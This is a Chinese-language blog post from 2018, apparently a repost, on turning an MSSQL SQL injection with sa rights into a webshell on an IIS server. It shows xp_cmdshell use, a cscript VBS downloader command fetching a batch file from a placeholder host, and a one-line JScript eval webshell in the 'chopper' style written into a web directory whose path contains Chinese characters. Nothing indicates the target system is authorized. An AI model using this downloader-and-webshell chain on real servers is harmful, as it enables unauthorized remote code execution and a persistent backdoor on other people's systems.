+++
title = "MSSQL遇中文转Unicode编码无法正常写入Shell"
author = "Hzllaga"
date =2018-07-23
description = "前几天练手，戳到一个SQL注入，SQL权限是sa按道理来说一般到这里就终止渗透了，但是因为是内网，想继续玩还是得有个Shell。在SQLMAP中如果获取一个OS-Shell的时候需要特定的SQL注入类型，可惜并不支持。"
categories = ["转载"]
tags = ["MSSQL","SQL注入"]
+++
![](https://cdn.wtfsec.org/img/20200223164802.jpg)

前几天练手，戳到一个SQL注入，SQL权限是sa按道理来说一般到这里就终止渗透了，但是因为是内网，想继续玩还是得有个Shell。在SQLMAP中如果获取一个OS-Shell的时候需要特定的SQL注入类型，可惜并不支持。

在系统后台中发现KindEditor没有洞。系统是2008 IIS7想来想去执行xp_cmdshell应该是没有问题的，应该只是说SQLMAP的问题，也没深入去研究SQLMAP。转Pangolin处理，执行cmd倒是没问题了，但是如果是在dir列目录到Web目录的时候直接读取不到，一头雾水。。

后在Pangolin里测试的时候执行了 `echo 官网勿删 > c:\w.txt` 随后 `type c:\w.txt` 返回 `&#23448;&#32593;&#21247;&#21024;` 既然有中文路径写Shell有一定问题，那换一种姿势。

我们知道Web的路径在哪里了，剩下就是如何把Shell写到Web目录里边去，只有MSSQL执行`xp_cmdshell`的话，其实很简单的直接用下载者就可以了，那么我测试了一下远程下载文件下载失败，写入文件可以。那自己手动写一个vbs下载者就可以了。

首先注意一点，在写下载者的时候里面不能出现任何中文字符，也就是说我们不能直接下载一个Shell到Web目录中。

找web目录可以参考这里：[echo-一句话写入读IIS配置vbs脚本](../echo-一句话写入读IIS配置vbs脚本/)

写入下载者参考这里：[echo一句话写入vbs下载者](../echo-一句话写入vbs下载者/)

`远程文件`中的内容：

{{< highlight vbs >}}
echo ^<%@ Page Language="Jscript"%^>^<%%eval(Request.Item["chopper"],"unsafe");%^> > x:\wwwroot(官网勿删)\x.aspx
{{< / highlight  >}}
然后运行
{{< highlight vbs >}}
cscript C:\get.vbs http://xxx.com/xxx.bat C:\xxx.bat
{{< / highlight  >}}
然后再运行那个批处理，就会发现webshell已经躺在web目录里面了。